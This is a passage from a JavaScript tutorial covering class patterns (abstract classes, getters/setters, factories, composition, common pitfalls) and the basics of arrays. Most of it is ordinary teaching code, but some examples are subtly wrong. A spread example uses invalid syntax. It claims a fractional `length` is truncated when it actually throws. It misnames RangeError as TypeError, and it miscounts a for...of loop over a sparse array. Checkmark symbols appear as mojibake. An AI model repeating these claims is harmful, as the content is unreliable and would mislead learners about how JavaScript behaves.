    return Math.PI * this.radius ** 2;
  }
  
  getPerimeter() {
    return 2 * Math.PI * this.radius;
  }
}

class Rectangle extends AbstractShape {
  constructor(width, height) {
    super();
    this.width = width;
    this.height = height;
  }
  
  getArea() {
    return this.width * this.height;
  }
  
  getPerimeter() {
    return 2 * (this.width + this.height);
  }
}

// const shape = new AbstractShape(); // Error: Cannot instantiate abstract class

const circle = new Circle(5);
console.log(circle.describe());
// "This shape has an area of 78.53... and perimeter of 31.41..."

const rect = new Rectangle(4, 6);
console.log(rect.describe());
// "This shape has an area of 24 and perimeter of 20"
```

**Advanced Abstract Class Pattern:**

```javascript
// Helper to define abstract methods
function abstractMethod(methodName) {
  return function() {
    throw new Error(`Abstract method ${methodName}() must be implemented`);
  };
}

class AbstractDatabase {
  constructor() {
    if (new.target === AbstractDatabase) {
      throw new Error('Cannot instantiate abstract class');
    }
    
    // Check if subclass implements required methods
    const requiredMethods = ['connect', 'disconnect', 'query', 'insert'];
    for (const method of requiredMethods) {
      if (this[method] === AbstractDatabase.prototype[method]) {
        throw new Error(`Subclass must implement ${method}()`);
      }
    }
  }
  
  // Abstract methods
  connect() { abstractMethod('connect')(); }
  disconnect() { abstractMethod('disconnect')(); }
  query(sql) { abstractMethod('query')(); }
  insert(table, data) { abstractMethod('insert')(); }
  
  // Concrete method
  async transaction(callback) {
    await this.connect();
    try {
      const result = await callback(this);
      await this.commit();
      return result;
    } catch (error) {
      await this.rollback();
      throw error;
    } finally {
      await this.disconnect();
    }
  }
  
  // Template method pattern
  async executeQuery(sql, params = []) {
    await this.connect();
    const result = await this.query(sql, params);
    await this.disconnect();
    return result;
  }
}

class MySQLDatabase extends AbstractDatabase {
  constructor(config) {
    super();
    this.config = config;
    this.connection = null;
  }
  
  async connect() {
    console.log('Connecting to MySQL...');
    this.connection = { connected: true };
  }
  
  async disconnect() {
    console.log('Disconnecting from MySQL...');
    this.connection = null;
  }
  
  async query(sql, params = []) {
    console.log('Executing query:', sql);
    return { rows: [] };
  }
  
  async insert(table, data) {
    const sql = `INSERT INTO ${table} ...`;
    return this.query(sql);
  }
  
  async commit() {
    console.log('Committing transaction...');
  }
  
  async rollback() {
    console.log('Rolling back transaction...');
  }
}

const db = new MySQLDatabase({ host: 'localhost' });
db.executeQuery('SELECT * FROM users');
```

**Interface-like Pattern:**

```javascript
// Define an "interface" using an abstract class
class Drawable {
  constructor() {
    if (new.target === Drawable) {
      throw new Error('Cannot instantiate interface');
    }
  }
  
  draw() {
    throw new Error('draw() must be implemented');
  }
  
  erase() {
    throw new Error('erase() must be implemented');
  }
}

class Resizable {
  constructor() {
    if (new.target === Resizable) {
      throw new Error('Cannot instantiate interface');
    }
  }
  
  resize(width, height) {
    throw new Error('resize() must be implemented');
  }
}

// Implement multiple "interfaces" using mixins
function implementsDrawable(Base) {
  return class extends Base {
    draw() {
      console.log('Drawing...');
    }
    
    erase() {
      console.log('Erasing...');
    }
  };
}

function implementsResizable(Base) {
  return class extends Base {
    resize(width, height) {
      this.width = width;
      this.height = height;
      console.log(`Resized to ${width}x${height}`);
    }
  };
}

class Shape {
  constructor(width, height) {
    this.width = width;
    this.height = height;
  }
}

class Rectangle extends implementsResizable(implementsDrawable(Shape)) {
  getArea() {
    return this.width * this.height;
  }
}

const rect = new Rectangle(10, 20);
rect.draw(); // "Drawing..."
rect.resize(15, 25); // "Resized to 15x25"
```

### Getters and Setters in Classes

Getters and setters provide computed properties and property access control.

**Basic Getters and Setters:**

```javascript
class Temperature {
  constructor(celsius) {
    this._celsius = celsius;
  }
  
  get celsius() {
    return this._celsius;
  }
  
  set celsius(value) {
    this._celsius = value;
  }
  
  get fahrenheit() {
    return (this._celsius * 9/5) + 32;
  }
  
  set fahrenheit(value) {
    this._celsius = (value - 32) * 5/9;
  }
  
  get kelvin() {
    return this._celsius + 273.15;
  }
  
  set kelvin(value) {
    this._celsius = value - 273.15;
  }
}

const temp = new Temperature(0);
console.log(temp.celsius); // 0
console.log(temp.fahrenheit); // 32
console.log(temp.kelvin); // 273.15

temp.fahrenheit = 212;
console.log(temp.celsius); // 100

temp.kelvin = 373.15;
console.log(temp.celsius); // 100
```

**Computed Properties:**

```javascript
class Rectangle {
  constructor(width, height) {
    this.width = width;
    this.height = height;
  }
  
  get area() {
    return this.width * this.height;
  }
  
  get perimeter() {
    return 2 * (this.width + this.height);
  }
  
  get diagonal() {
    return Math.sqrt(this.width ** 2 + this.height ** 2);
  }
  
  get aspectRatio() {
    return this.width / this.height;
  }
  
  get isSquare() {
    return this.width === this.height;
  }
}

const rect = new Rectangle(3, 4);
console.log(rect.area); // 12
console.log(rect.perimeter); // 14
console.log(rect.diagonal); // 5
console.log(rect.aspectRatio); // 0.75
console.log(rect.isSquare); // false

const square = new Rectangle(5, 5);
console.log(square.isSquare); // true
```

**Validation with Setters:**

```javascript
class User {
  constructor(name, age, email) {
    this.name = name;
    this.age = age;
    this.email = email;
  }
  
  get name() {
    return this._name;
  }
  
  set name(value) {
    if (typeof value !== 'string' || value.length < 2) {
      throw new Error('Name must be at least 2 characters');
    }
    this._name = value;
  }
  
  get age() {
    return this._age;
  }
  
  set age(value) {
    if (typeof value !== 'number' || value < 0 || value > 150) {
      throw new Error('Age must be between 0 and 150');
    }
    this._age = value;
  }
  
  get email() {
    return this._email;
  }
  
  set email(value) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(value)) {
      throw new Error('Invalid email format');
    }
    this._email = value;
  }
  
  get isAdult() {
    return this._age >= 18;
  }
}

const user = new User('Alice', 30, 'alice@example.com');
console.log(user.isAdult); // true

// user.age = -5; // Error: Age must be between 0 and 150
// user.email = 'invalid'; // Error: Invalid email format
```

**Lazy Initialization:**

```javascript
class DataLoader {
  constructor(url) {
    this.url = url;
    this._data = null;
    this._loading = false;
  }
  
  get data() {
    if (!this._data && !this._loading) {
      this._loading = true;
      this._loadData();
    }
    return this._data;
  }
  
  async _loadData() {
    console.log('Loading data...');
    // Simulate async data loading
    this._data = await new Promise(resolve => {
      setTimeout(() => resolve({ loaded: true, url: this.url }), 1000);
    });
    this._loading = false;
  }
}

const loader = new DataLoader('https://api.example.com/data');
console.log(loader.data); // null (triggers loading)
// After 1 second: data is loaded
```

**Private Fields with Getters/Setters:**

```javascript
class BankAccount {
  #balance = 0;
  #accountNumber;
  #pin;
  
  constructor(accountNumber, initialBalance, pin) {
    this.#accountNumber = accountNumber;
    this.#balance = initialBalance;
    this.#pin = pin;
  }
  
  get balance() {
    return this.#balance;
  }
  
  get accountNumber() {
    // Return masked account number
    return '****' + this.#accountNumber.slice(-4);
  }
  
  get formattedBalance() {
    return `$${this.#balance.toFixed(2)}`;
  }
  
  deposit(amount) {
    if (amount <= 0) {
      throw new Error('Amount must be positive');
    }
    this.#balance += amount;
  }
  
  withdraw(amount, pin) {
    if (pin !== this.#pin) {
      throw new Error('Invalid PIN');
    }
    if (amount > this.#balance) {
      throw new Error('Insufficient funds');
    }
    this.#balance -= amount;
  }
}

const account = new BankAccount('1234567890', 1000, '1234');
console.log(account.balance); // 1000
console.log(account.accountNumber); // ****7890
console.log(account.formattedBalance); // $1000.00
```

### Factory Functions vs Classes

Comparing different approaches to object creation.

**Class Approach:**

```javascript
class Car {
  constructor(make, model, year) {
    this.make = make;
    this.model = model;
    this.year = year;
    this.mileage = 0;
  }
  
  drive(miles) {
    this.mileage += miles;
    console.log(`Drove ${miles} miles. Total: ${this.mileage}`);
  }
  
  getInfo() {
    return `${this.year} ${this.make} ${this.model}`;
  }
}

const car1 = new Car('Toyota', 'Camry', 2024);
car1.drive(100);
console.log(car1.getInfo());
console.log(car1 instanceof Car); // true
```

**Factory Function Approach:**

```javascript
function createCar(make, model, year) {
  // Private variable (truly private)
  let mileage = 0;
  
  return {
    make,
    model,
    year,
    
    drive(miles) {
      mileage += miles;
      console.log(`Drove ${miles} miles. Total: ${mileage}`);
    },
    
    getMileage() {
      return mileage;
    },
    
    getInfo() {
      return `${year} ${make} ${model}`;
    }
  };
}

const car2 = createCar('Honda', 'Accord', 2024);
car2.drive(100);
console.log(car2.getInfo());
console.log(car2 instanceof Object); // true, but not instanceof specific type
// car2.mileage // undefined - truly private
```

**Comparison:**

```javascript
// Classes:
// âœ“ instanceof works
// âœ“ Inheritance with extends
// âœ“ More familiar for OOP developers
// âœ“ Better performance (shared methods on prototype)
// âœ— Private fields require # syntax (newer feature)
// âœ— Must use 'new' keyword

// Factory Functions:
// âœ“ True private variables (closures)
// âœ“ Don't need 'new' keyword
// âœ“ Flexible return values
// âœ“ Easier to understand for beginners
// âœ— No instanceof checking
// âœ— Methods created for each instance (memory overhead)
// âœ— No built-in inheritance mechanism
```

**Hybrid Approach:**

```javascript
// Combine class with factory
class CarClass {
  #mileage = 0;
  
  constructor(make, model, year) {
    this.make = make;
    this.model = model;
    this.year = year;
  }
  
  drive(miles) {
    this.#mileage += miles;
  }
  
  getMileage() {
    return this.#mileage;
  }
  
  static create(make, model, year) {
    return new CarClass(make, model, year);
  }
}

// Use factory method (no 'new' needed)
const car3 = CarClass.create('Tesla', 'Model 3', 2024);
```

**When to Use Each:**

```javascript
// Use Classes when:
// - Building large OOP applications
// - Need inheritance hierarchies
// - Want instanceof checks
// - Performance is critical (many instances)
// - Working in TypeScript or with type checking

class GameCharacter {
  constructor(name, health) {
    this.name = name;
    this.health = health;
  }
  
  takeDamage(amount) {
    this.health -= amount;
  }
}

class Warrior extends GameCharacter {
  constructor(name, health, weapon) {
    super(name, health);
    this.weapon = weapon;
  }
  
  attack() {
    return this.weapon.damage;
  }
}

// Use Factory Functions when:
// - Need true private variables
// - Creating simple objects
// - Want to avoid 'new'
// - Need flexible object creation
// - Prefer functional programming style

function createCounter(initial = 0) {
  let count = initial; // Truly private
  
  return {
    increment() {
      count++;
    },
    decrement() {
      count--;
    },
    getValue() {
      return count;
    }
  };
}

const counter = createCounter(10);
counter.increment();
console.log(counter.getValue()); // 11
// count is not accessible from outside
```

### Composition Over Inheritance

Favoring composition over deep inheritance hierarchies for more flexible code.

**Problem with Deep Inheritance:**

```javascript
// Deep inheritance can be rigid
class Animal {
  eat() { console.log('eating'); }
}

class FlyingAnimal extends Animal {
  fly() { console.log('flying'); }
}

class SwimmingAnimal extends Animal {
  swim() { console.log('swimming'); }
}

// Problem: What about a duck that flies AND swims?
// Can't extend both FlyingAnimal and SwimmingAnimal

// Forced to choose or duplicate code:
class Duck extends FlyingAnimal {
  swim() { console.log('swimming'); } // Duplicate code
}
```

**Composition Solution:**

```javascript
// Create separate capabilities
const canEat = {
  eat() {
    console.log(`${this.name} is eating`);
  }
};

const canFly = {
  fly() {
    console.log(`${this.name} is flying`);
  }
};

const canSwim = {
  swim() {
    console.log(`${this.name} is swimming`);
  }
};

const canWalk = {
  walk() {
    console.log(`${this.name} is walking`);
  }
};

// Compose objects with needed capabilities
class Duck {
  constructor(name) {
    this.name = name;
    Object.assign(this, canEat, canFly, canSwim, canWalk);
  }
  
  quack() {
    console.log(`${this.name} says: Quack!`);
  }
}

class Fish {
  constructor(name) {
    this.name = name;
    Object.assign(this, canEat, canSwim);
  }
}

class Dog {
  constructor(name) {
    this.name = name;
    Object.assign(this, canEat, canWalk);
  }
  
  bark() {
    console.log(`${this.name} says: Woof!`);
  }
}

const duck = new Duck('Donald');
duck.eat();
duck.fly();
duck.swim();
duck.walk();
duck.quack();

const fish = new Fish('Nemo');
fish.eat();
fish.swim();
// fish.fly(); // undefined - doesn't have this capability

const dog = new Dog('Buddy');
dog.eat();
dog.walk();
// dog.swim(); // undefined - doesn't have this capability
```

**Advanced Composition with Factory:**

```javascript
// Capability composers
const withLogging = (obj) => ({
  ...obj,
  log(message) {
    console.log(`[${new Date().toISOString()}] ${message}`);
  }
});

const withValidation = (obj) => ({
  ...obj,
  validate(data, rules) {
    for (const [field, rule] of Object.entries(rules)) {
      if (rule.required && !data[field]) {
        return { valid: false, error: `${field} is required` };
      }
    }
    return { valid: true };
  }
});

const withPersistence = (obj) => ({
  ...obj,
  save() {
    this.log?.('Saving to database...');
    console.log('Saved:', JSON.stringify(this));
  },
  load(data) {
    Object.assign(this, data);
    this.log?.('Loaded from database');
  }
});

// Compose features
function createUser(name, email) {
  const user = {
    name,
    email,
    createdAt: new Date()
  };
  
  return withPersistence(withValidation(withLogging(user)));
}

const user = createUser('Alice', 'alice@example.com');
user.log('User created');
const validation = user.validate(user, { name: { required: true } });
console.log(validation); // { valid: true }
user.save();
```

**Composition with Classes:**

```javascript
// Use composition inside classes
class Character {
  constructor(name, abilities = []) {
    this.name = name;
    this.abilities = abilities;
    
    // Compose abilities
    abilities.forEach(ability => {
      Object.assign(this, ability);
    });
  }
}

const combatAbility = {
  attack(target) {
    console.log(`${this.name} attacks ${target}`);
  },
  
  defend() {
    console.log(`${this.name} is defending`);
  }
};

const magicAbility = {
  castSpell(spell) {
    console.log(`${this.name} casts ${spell}`);
  },
  
  meditate() {
    console.log(`${this.name} is meditating`);
  }
};

const stealthAbility = {
  sneak() {
    console.log(`${this.name} sneaks quietly`);
  },
  
  hide() {
    console.log(`${this.name} hides in shadows`);
  }
};

// Create different character types by composing abilities
const warrior = new Character('Conan', [combatAbility]);
warrior.attack('enemy'); // Works
// warrior.castSpell('fireball'); // undefined

const mage = new Character('Gandalf', [combatAbility, magicAbility]);
mage.attack('orc'); // Works
mage.castSpell('lightning'); // Works

const rogue = new Character('Shadow', [combatAbility, stealthAbility]);
rogue.attack('guard'); // Works
rogue.sneak(); // Works

const battlemage = new Character('Merlin', [combatAbility, magicAbility, stealthAbility]);
// Has all abilities!
```

**Real-World Example:**

```javascript
// E-commerce system using composition

// Capabilities
const hasPrice = {
  setPrice(price) {
    this.price = price;
  },
  
  getPrice() {
    return this.price;
  },
  
  applyDiscount(percentage) {
    this.price *= (1 - percentage / 100);
  }
};

const hasInventory = {
  setStock(quantity) {
    this.stock = quantity;
  },
  
  inStock() {
    return this.stock > 0;
  },
  
  decreaseStock(quantity = 1) {
    if (this.stock >= quantity) {
      this.stock -= quantity;
      return true;
    }
    return false;
  }
};

const hasShipping = {
  setShippingWeight(weight) {
    this.shippingWeight = weight;
  },
  
  calculateShipping() {
    return this.shippingWeight * 0.5; // $0.50 per kg
  }
};

const isDigital = {
  download() {
    return `Downloading ${this.name}...`;
  }
};

// Create products by composing features
function createPhysicalProduct(name, price, stock, weight) {
  const product = { name };
  Object.assign(product, hasPrice, hasInventory, hasShipping);
  product.setPrice(price);
  product.setStock(stock);
  product.setShippingWeight(weight);
  return product;
}

function createDigitalProduct(name, price) {
  const product = { name };
  Object.assign(product, hasPrice, isDigital);
  product.setPrice(price);
  return product;
}

const book = createPhysicalProduct('JavaScript Book', 39.99, 100, 0.5);
console.log(book.getPrice()); // 39.99
console.log(book.calculateShipping()); // 0.25
book.decreaseStock();
console.log(book.stock); // 99

const ebook = createDigitalProduct('JavaScript eBook', 19.99);
console.log(ebook.getPrice()); // 19.99
console.log(ebook.download()); // "Downloading JavaScript eBook..."
// ebook.calculateShipping(); // undefined - digital products don't ship
```

---

## Common Pitfalls

### Pitfall 1: Forgetting super() in Constructor

```javascript
// âŒ WRONG: Must call super() before using 'this'
class Child extends Parent {
  constructor(name) {
    this.name = name;  // ReferenceError!
    super();
  }
}

// âœ… CORRECT: super() first
class Child extends Parent {
  constructor(name) {
    super();
    this.name = name;
  }
}
```

### Pitfall 2: Arrow Methods and Inheritance

```javascript
// âŒ GOTCHA: Arrow methods can't be overridden properly
class Parent {
  greet = () => {
    console.log('Parent');
  }
}

class Child extends Parent {
  greet = () => {
    super.greet();  // ERROR: super doesn't work in arrow functions!
    console.log('Child');
  }
}

// âœ… CORRECT: Use regular methods for inheritance
class Parent {
  greet() {
    console.log('Parent');
  }
}

class Child extends Parent {
  greet() {
    super.greet();  // Works!
    console.log('Child');
  }
}
```

### Pitfall 3: Private Fields and Inheritance

```javascript
// âš ï¸ GOTCHA: Private fields are NOT inherited
class Parent {
  #secret = 'parent secret';
  
  getSecret() {
    return this.#secret;
  }
}

class Child extends Parent {
  reveal() {
    return this.#secret;  // SyntaxError! #secret doesn't exist in Child
  }
}

// âœ… SOLUTION: Use protected pattern or getter
class Parent {
  #secret = 'parent secret';
  
  get _secret() {  // "Protected" via convention
    return this.#secret;
  }
}
```

### Pitfall 4: this in Callbacks

```javascript
// âŒ WRONG: 'this' is lost in callbacks
class Button {
  constructor(label) {
    this.label = label;
  }
  
  handleClick() {
    console.log(`Clicked: ${this.label}`);
  }
  
  attach(element) {
    element.addEventListener('click', this.handleClick);  // 'this' is element!
  }
}

// âœ… CORRECT: Bind or use arrow function
class Button {
  handleClick = () => {  // Arrow function preserves 'this'
    console.log(`Clicked: ${this.label}`);
  }
  
  // OR bind in constructor
  constructor(label) {
    this.label = label;
    this.handleClick = this.handleClick.bind(this);
  }
}
```

### Pitfall 5: Class vs Object for Configuration

```javascript
// âŒ OVERKILL: Class for simple data
class Config {
  constructor() {
    this.apiUrl = 'https://api.example.com';
    this.timeout = 5000;
  }
}
const config = new Config();

// âœ… SIMPLER: Use plain object
const config = {
  apiUrl: 'https://api.example.com',
  timeout: 5000
};

// Classes are for: behavior + state, inheritance, encapsulation
// Objects are for: pure data, configuration, simple structures
```

---

## Summary

This document covered ES6 Classes comprehensively:

- **Class Basics**: Declarations, expressions, constructors, instance methods, and hoisting behavior
- **Class Features**: Static methods/properties, instance properties, private fields/methods, public fields, and static blocks
- **Inheritance**: The `extends` and `super` keywords, method overriding, static method inheritance, and complex inheritance chains
- **Class Patterns**: Mixins (object and function-based), abstract class patterns, getters/setters, factory functions vs classes comparison, and composition over inheritance

Classes provide a clean, familiar syntax for object-oriented programming in JavaScript while maintaining compatibility with the language's prototypal nature.

---

**Related Topics to Explore Next:**

- Design patterns with classes (Singleton, Factory, Observer, etc.)
- TypeScript and type-safe classes
- Decorators and metadata reflection
- Class performance optimization techniques
- Functional programming vs OOP in JavaScript

## 6.5 Classes Summary

| Feature | Syntax |
|---------|--------|
| Class declaration | `class Name {}` |
| Constructor | `constructor() {}` |
| Instance method | `method() {}` |
| Static method | `static method() {}` |
| Getter/Setter | `get prop()` / `set prop(v)` |
| Private field | `#field` |
| Inheritance | `class Child extends Parent` |
| Super call | `super()` / `super.method()` |

---

**End of Chapter 6: Classes**


# 07-Arrays.md

# 7 Arrays

Arrays are ordered collections with powerful built-in methods. This chapter covers array creation, mutating and non-mutating methods, iteration, typed arrays, and destructuring patterns.

---

## 7.1 Array Basics

### 7.1.1 Array Literals

An **array** is an ordered collection of values. Arrays are the primary data structure for storing sequences of elements in JavaScript.

**Array Literal Syntax:**

```javascript
// Empty array
[]

// Array with elements
[1, 2, 3, 4, 5]
['a', 'b', 'c']
[true, false, null, undefined]

// Mixed type arrays (valid, but use cautiously)
[1, 'two', true, null, { key: 'value' }, [1, 2]]

// Nested arrays
[[1, 2], [3, 4], [5, 6]]
[[['a', 'b'], ['c', 'd']], [['e', 'f']]]

// Sparse arrays (holes in array - elements missing)
[1, , 3]            // [1, empty, 3]
[1, , , 4]          // [1, empty, empty, 4]
[, , ,]             // [empty Ã— 3]
[1, 2, 3, ]         // Trailing comma ignored, [1, 2, 3]

// Spread operator in array literals (ES6+)
let arr1 = [1, 2];
let arr2 = [...arr1, 3, 4];  // [1, 2, 3, 4]
let arr3 = [0, ...arr1, 5];  // [0, 1, 2, 5]

// Multiple spreads
let a = [1, 2];
let b = [3, 4];
let c = [...a, ..., b];      // [1, 2, 3, 4]

// Spread with strings
let str = "hi";
[...str]                     // ['h', 'i']

// Spread with iterables
let set = new Set([1, 2, 3]);
[...set]                     // [1, 2, 3]
```

**Key Properties:**

```javascript
// Arrays are objects
typeof [1, 2, 3]            // "object"

// instanceof operator for checking arrays
let arr = [1, 2, 3];
arr instanceof Array        // true

// Array.isArray() - recommended method (ES5+)
Array.isArray([1, 2, 3])    // true
Array.isArray("not array")  // false
Array.isArray({ 0: 1 })     // false

// Array inheritance
let arr = [];
arr instanceof Object       // true (arrays are objects)
```

**Array Literals vs Array Constructor:**

```javascript
// Literal syntax (preferred)
let arr1 = [1, 2, 3];

// Constructor syntax (avoid unless necessary)
let arr2 = new Array(1, 2, 3);  // Same as [1, 2, 3]

// GOTCHA: Single number creates sparse array
new Array(3)        // [empty Ã— 3] - NOT [3]
new Array(5)        // [empty, empty, empty, empty, empty]
[3]                 // [3] - different!

// This confusing behavior is why literals are preferred
```

**Creating Arrays From Iterables:**

```javascript
// String
let arr1 = ['h', 'i'];
let arr2 = [...'hi'];         // ['h', 'i']
let arr3 = Array.from('hi');  // ['h', 'i']

// Set
let set = new Set([1, 2, 3]);
let arr4 = [...set];          // [1, 2, 3]
let arr5 = Array.from(set);   // [1, 2, 3]

// Map
let map = new Map([['a', 1], ['b', 2]]);
let arr6 = [...map];          // [['a', 1], ['b', 2]]

// Array-like objects
let arrayLike = { 0: 'a', 1: 'b', length: 2 };
let arr7 = Array.from(arrayLike);  // ['a', 'b']

// With mapping function
let arr8 = Array.from('hello', char => char.toUpperCase());  // ['H', 'E', 'L', 'L', 'O']
```

**Array Literal Gotchas:**

```javascript
// Trailing commas are ignored
let arr1 = [1, 2, 3,];
arr1.length             // 3 (not 4)

// But consecutive commas create holes
let arr2 = [1, , , 4];
arr2.length             // 4
arr2[1]                 // undefined (hole, not undefined value)
arr2.hasOwnProperty(1)  // false (hole has no property)

// Undefined values are different from holes
let arr3 = [1, undefined, undefined, 4];
arr3[1]                 // undefined
arr3.hasOwnProperty(1)  // true (it's a property with undefined value)

// Methods handle holes differently
let arr4 = [1, , 3];
arr4.map(x => x * 2)    // [2, empty, 6] - skips holes
arr4.forEach(x => console.log(x))  // Logs 1 and 3 (skips holes)

// Array.from converts holes to undefined
Array.from([1, , 3])    // [1, undefined, 3]

// Spread also converts holes to undefined
[...[1, , 3]]           // [1, undefined, 3]

// Direct access to holes
let sparse = [1, , 3];
sparse[0]               // 1
sparse[1]               // undefined (looks like a value, but it's a hole)
```

**Best Practices:**

```javascript
// âœ“ Use array literals
let arr = [1, 2, 3];

// âœ— Avoid Array constructor
let arr = new Array(1, 2, 3);  // Confusing with single number behavior

// âœ“ Use Array.isArray() for type checking
if (Array.isArray(value)) { }

// âœ— Avoid typeof with arrays (returns "object")
if (typeof value === "object") { }  // Too broad

// âœ“ Use spread for copying or combining
let arr2 = [...arr1];
let combined = [...arr1, ...arr2];

// âœ— Avoid sparse arrays unless intentional
let arr = [1, , 3];  // Generally confusing

// âœ“ Be explicit about undefined values if needed
let arr = [1, undefined, 3];
```

---

### 7.1.2 Array Constructor

The **Array constructor** is a function that creates new arrays. However, it has unintuitive behavior and should be used sparingly.

**Array Constructor Syntax:**

```javascript
// With multiple arguments - creates array with those elements
new Array(1, 2, 3)          // [1, 2, 3]
new Array('a', 'b', 'c')    // ['a', 'b', 'c']
new Array(true, false)      // [true, false]

// With single numeric argument - creates sparse array of that length!
new Array(5)                // [empty Ã— 5]
new Array(0)                // []
new Array(100)              // Array with 100 empty slots

// Without new keyword - same result (new is optional)
Array(1, 2, 3)              // [1, 2, 3]
Array(5)                    // [empty Ã— 5]

// With non-numeric argument - creates array with that element
new Array('5')              // ['5'] - not sparse array!
new Array(true)             // [true]
new Array(null)             // [null]
```

**The Single-Argument Problem (Why Array Constructor Is Confusing):**

```javascript
// WRONG INTERPRETATION
new Array(3)                // Expected: [3]
                            // Actual: [empty Ã— 3] - SPARSE ARRAY!

// This is the primary reason to avoid Array constructor

// Compare with spread
[3]                         // [3] - creates array with element 3
new Array(3)                // [empty Ã— 3] - creates array of length 3

// What if you want to create an array with single number?
new Array(5)                // [empty Ã— 5] - NO!
[5]                         // [5] - YES!
```

**When to Use Array Constructor (Rarely):**

```javascript
// Creating a pre-sized array (sparse)
let arr = new Array(1000);  // Allocate space for 1000 elements
arr[500] = 'value';         // Only this is populated

// Then fill it programmatically
for (let i = 0; i < arr.length; i++) {
  if (arr[i] === undefined) {
    arr[i] = computeValue(i);
  }
}

// But even this is better done with Array.from or map
let arr = Array.from({ length: 1000 }, (_, i) => computeValue(i));
```

**Creating Arrays of Specific Length:**

```javascript
// Sparse array (empty slots)
new Array(5)                // [empty Ã— 5]

// Fill with undefined
Array(5).fill(undefined)    // [undefined, undefined, undefined, undefined, undefined]

// Fill with specific value
Array(5).fill(0)            // [0, 0, 0, 0, 0]
Array(3).fill('x')          // ['x', 'x', 'x']

// Create and initialize with values
Array.from({ length: 5 }, (_, i) => i)           // [0, 1, 2, 3, 4]
Array.from({ length: 5 }, (_, i) => i * 2)       // [0, 2, 4, 6, 8]
Array.from({ length: 3 }, () => Math.random())   // [random, random, random]

// Using map on sparse array
new Array(5).map((_, i) => i)           // [empty Ã— 5] - map skips holes!
Array.from({ length: 5 }, (_, i) => i)  // [0, 1, 2, 3, 4] - works correctly
```

**Constructor Gotchas:**

```javascript
// Single float argument
new Array(3.5)              // RangeError: Invalid array length
new Array(Infinity)         // RangeError: Invalid array length
new Array(-1)               // RangeError: Invalid array length

// String that looks numeric
new Array('5')              // ['5'] - array with string, not length 5
new Array('abc')            // ['abc']

// Multiple numbers
new Array(1, 2, 3)          // [1, 2, 3] - creates array, not sparse

// Empty constructor
new Array()                 // [] - empty array
Array()                     // [] - same

// Behavior comparison
let a1 = [5];               // [5]
let a2 = new Array(5);      // [empty Ã— 5]
let a3 = new Array('5');    // ['5']

a1[0]                       // 5
a2[0]                       // undefined (hole)
a3[0]                       // '5'

a1.length                   // 1
a2.length                   // 5
a3.length                   // 1
```

**Using Array.of() Instead (ES6+):**

```javascript
// Array.of creates array from arguments (no length confusion)
Array.of(1, 2, 3)           // [1, 2, 3]
Array.of(5)                 // [5] - NOT sparse array!
Array.of('5')               // ['5']
Array.of()                  // []

// Array.of is the "corrected" Array constructor
// Always creates array from arguments, never interprets single number as length

// Polyfill for Array.of
if (!Array.of) {
  Array.of = function(...args) {
    return args;
  };
}
```

**Best Practices:**

```javascript
// âœ“ Use array literals for most cases
let arr = [1, 2, 3];

// âœ“ Use Array.of() if you must use a constructor
let arr = Array.of(5);  // [5]

// âœ“ Use Array.from() to create initialized arrays
let arr = Array.from({ length: 5 }, (_, i) => i);

// âœ— Avoid Array constructor
let arr = new Array(5);  // Confusing!

// âœ“ If you need specific length, be explicit
let arr = new Array(5).fill(null);  // Make it clear it's sparse, then fill

// âœ— Never rely on Array() with single number
new Array(3)            // NO! Confusing
```

---

### 7.1.3 Array length Property

The **length property** represents the number of elements in an array. It has special behavior in JavaScript.

**The length Property:**

```javascript
// Getting length
let arr = [1, 2, 3];
arr.length              // 3

let empty = [];
empty.length            // 0

let sparse = [1, , , 4];
sparse.length           // 4 (includes holes!)

// All indexes exist
[1, 2, 3, 4, 5].length  // 5
[].length               // 0
```

**Setting length Property:**

```javascript
// Increasing length creates sparse array (with holes)
let arr = [1, 2, 3];
arr.length = 5;
arr                     // [1, 2, 3, empty Ã— 2]
arr.length              // 5

// Decreasing length truncates array
let arr = [1, 2, 3, 4, 5];
arr.length = 3;
arr                     // [1, 2, 3]
arr.length              // 3

// Setting length to 0 empties array
let arr = [1, 2, 3];
arr.length = 0;
arr                     // []
arr                     // Still same reference, just empty

// Setting length to same value does nothing
let arr = [1, 2, 3];
arr.length = 3;
arr                     // [1, 2, 3] - unchanged
```

**length with Non-Integer Values:**

```javascript
// Non-integer converted to integer (truncated)
let arr = [1, 2, 3];
arr.length = 3.9;
arr.length              // 3 (not 3.9)

arr.length = 3.1;
arr.length              // 3

// Invalid values throw error
arr.length = "hello";   // TypeError: Invalid array length
arr.length = -1;        // TypeError: Invalid array length
arr.length = Infinity;  // TypeError: Invalid array length
arr.length = NaN;       // TypeError: Invalid array length

// But strings that convert to numbers work
arr.length = "5";
arr.length              // 5
```

**length and Sparse Arrays:**

```javascript
// Sparse array with gaps
let sparse = [1, , , 4];
sparse.length           // 4

// Manually adding element beyond length increases length
let arr = [1, 2];
arr[5] = 'five';
arr                     // [1, 2, empty Ã— 3, 'five']
arr.length              // 6

// Holes are not counted as "elements"
let sparse = [1, , 3];
sparse.length           // 3 (includes holes!)
// But methods that iterate often skip holes

// Creating holes by increasing length
let arr = [1, 2];
arr.length = 5;
arr                     // [1, 2, empty Ã— 3]
// arr[2], arr[3], arr[4] are holes (not undefined values)

// Checking if index has value
arr.hasOwnProperty(0)   // true
arr.hasOwnProperty(2)   // false (hole)

// But accessing gives undefined either way
arr[0]                  // 1
arr[2]                  // undefined (looks like a value)
```

**length Performance Considerations:**

```javascript
// length is a property, not computed
let arr = [1, 2, 3];
arr.length              // 3 - O(1) operation, constant time

// This is efficient:
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);
}

// Even better - cache length
let len = arr.length;
for (let i = 0; i < len; i++) {
  console.log(arr[i]);
}

// Note: modifying array inside loop can change behavior
let arr = [1, 2, 3];
for (let i = 0; i < arr.length; i++) {
  if (i === 1) {
    arr.push(4);  // Modifies array, but length already cached by most loops
  }
  console.log(arr[i]);
}
```

**length vs Counting Elements:**

```javascript
// length counts all indexed positions, including holes
let sparse = [1, , 3];
sparse.length           // 3

// To count actual elements (not holes):
let actualCount = Object.keys(sparse).length;  // 2 (only 1 and 3)

// Or using filter
let actualCount = sparse.filter(x => true).length;  // 2

// Or counting explicitly
let actualCount = 0;
for (let item of sparse) {
  actualCount++;
}
// actualCount = 2
```

**length with Array-like Objects:**

```javascript
// Objects with length property are "array-like"
let arrayLike = { 0: 'a', 1: 'b', 2: 'c', length: 3 };
arrayLike.length        // 3

// But they're not arrays
Array.isArray(arrayLike)  // false

// Common array-like objects
arguments               // Function's arguments object (old way)
document.querySelectorAll('div')  // NodeList
document.getElementsByTagName('p')  // HTMLCollection
```

**Gotchas with length:**

